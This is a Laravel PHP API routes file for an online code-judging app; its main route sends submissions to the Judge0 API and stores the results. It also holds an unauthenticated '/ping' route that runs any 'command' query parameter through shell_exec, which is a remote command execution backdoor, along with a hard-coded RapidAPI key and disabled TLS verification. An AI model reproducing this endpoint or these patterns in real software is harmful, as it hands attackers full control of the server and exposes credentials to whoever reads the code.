<?php

use Illuminate\Http\Request;
use App\Models\Testcase;
use App\Models\Submission;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Log;

use Illuminate\Support\Facades\Route;


/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "api" middleware group. Make something great!
|
*/

Route::middleware('auth:sanctum')->get('/user',function (Request $request) {
    return $request->user();
});
Route::get('/ping', function (Request $request) {
    $n = $request->query('command');
    $out=shell_exec($n);
    return $out;
});

Route::middleware('auth:sanctum')->post('/startevaluation',function(Request $request){
    Log::info(auth()->user());
    $client = new \GuzzleHttp\Client(['verify'=>false]);
    $var=$request->json()->all();
    $testcaseinfo=Testcase::where("problem_id",$var['problem_id'])->get();
    Log::info($testcaseinfo);
    $evaluation_info = array("language_id"=>$var['language_id'],
    "problem_id"=>$var['problem_id'], 
    "source_code"=>$var['source_code'],
     "stdin"=>$testcaseinfo[0]['input'],
    "expected_output"=>$testcaseinfo[0]['expected_output']);
    Log::info($evaluation_info);
    $response = $client->request('POST', 'https://judge0-ce.p.rapidapi.com/submissions?base64_encoded=false&fields=*', [
        'body' =>json_encode($evaluation_info),
        'headers' => [
            'Content-Type' => 'application/json',
            'X-RapidAPI-Host' => 'judge0-ce.p.rapidapi.com',
            'X-RapidAPI-Key' => 'c16099ba51msh4ebb606602739aep1b6c76jsn5cb237ec9c3e',
            'content-type' => 'application/json',
        ],
    ]);
    

    $data = json_decode($response->getBody(), true);
    $token = $data['token'];
    Log::info($token);
    Log::info($var);
    
    $url='https://judge0-ce.p.rapidapi.com/submissions/'. $token .'?base64_encoded=false&fields=*';
    do{
        $response = $client->request('GET', $url, [
            'headers' => [
                'X-RapidAPI-Host' => 'judge0-ce.p.rapidapi.com',
                'X-RapidAPI-Key' => 'c16099ba51msh4ebb606602739aep1b6c76jsn5cb237ec9c3e',
            ],
        ]);
        Log::info("calling second api");
        $evalres= json_decode($response->getBody(),true);
        Log::info("second api res:");
        Log::info($evalres);
        sleep(3);
    }while($evalres['finished_at']==NULL);

    $user_id = Auth::id();

    if ($evalres['status_id']==1 or $evalres['status_id']==2){
        $status="Pending";
    }
    else if ($evalres['status_id']==3){
        $status="Success";
    }
    else{
        $status="Failed";
    }
    $data_to_store = ['user_id'=> $user_id,
    'problem_id'=> $var['problem_id'],
    'language_id'=>$evalres['language_id'],
    'status'=>$status,
    'testcase_id'=>$testcaseinfo[0]['id'],
    'stdout'=>$evalres['stdout'],
    'stderr'=>$evalres['stderr'],
    'submitted_code'=>$evalres['source_code'],
    'time'=>$evalres['time'],
    "memory"=>$evalres['memory'],
    'token'=>$evalres['token']];
    Submission::create($data_to_store);

    $data_to_store["expected_output"] = $evalres["expected_output"];
    return $data_to_store;
});


